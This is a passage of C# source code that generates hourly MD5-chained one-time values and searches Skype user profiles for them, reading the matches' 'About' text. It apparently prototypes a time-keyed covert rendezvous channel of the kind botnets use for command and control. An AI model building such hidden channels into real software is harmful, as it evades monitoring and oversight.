                        bs = md5Hash.ComputeHash(bs);
                        StringBuilder s = new StringBuilder();
                        foreach (byte b in bs)
                        {
                            s.Append(b.ToString());
                        }
                        //Populate the S/KEY hash
                        OTPTable.Add(iCount, GetString(bs).ToString());
                        iCount = iCount + 1;
                    }
                }
            }
            catch (Exception E)
            {
                // MessageBox.Show(E.Message);
            }
            return true;
        }

        private void genOneTimePasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //One per hour
            GenOneTimePasswordStack(24);

        }
        private static string GetTime(double value)
        {
            DateTime dt = new DateTime();
            string sTime;
            dt = dt.AddHours(value);
            sTime = dt.Year + ":" + dt.Month + ":" + ":" + dt.Day + ":" + dt.Hour;

            if (sTime != null)
                return sTime;
            else
                return null;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string AppName;
            SKYPE4COMLib.Application oApplication = new SKYPE4COMLib.Application();
            SKYPE4COMLib.ApplicationStream oApplicationStream = new SKYPE4COMLib.ApplicationStream();
            //Dim user As SKYPE4COMLib.User

            SKYPE4COMLib.TUserStatus cUserStatus_Offline = oSkype.Convert.TextToUserStatus("OFFLINE");
            SKYPE4COMLib.TUserStatus cUserStatus_Online = oSkype.Convert.TextToUserStatus("ONLINE");

            if (OTPTable.Count > 0)
            {
                OTPTable.Clear();
            }
            //One per hour
            GenOneTimePasswordStack(24);
            if (!oSkype.Client.IsRunning)
            {
                try
                {
                    oSkype.Client.Start(true, true);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            System.Threading.Thread.Sleep(1000);
            try
            {
                oSkype.Attach(5, true);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            oApplication = oSkype.get_Application("SSD");

            if (oApplication != null)
            {
                oApplication.Create();
            }
            AppName = oApplication.Name;
            DateTime dt = DateTime.Now;
            string sSearch = OTPTable[dt.Hour].ToString();
            UserCollection uCol = oSkype.SearchForUsers(sSearch);

            foreach (User u in uCol)
            {
                string uName = u.FullName;
                string uInfo = u.About;
                MessageBox.Show(uName + " " + uInfo);
            }
            MyThread = new Thread(new ThreadStart(StartScheduler));
            MyThread.Start();
            MessageBox.Show(sSearch);
            //MessageBox.Show(AppName);
        }
    }
}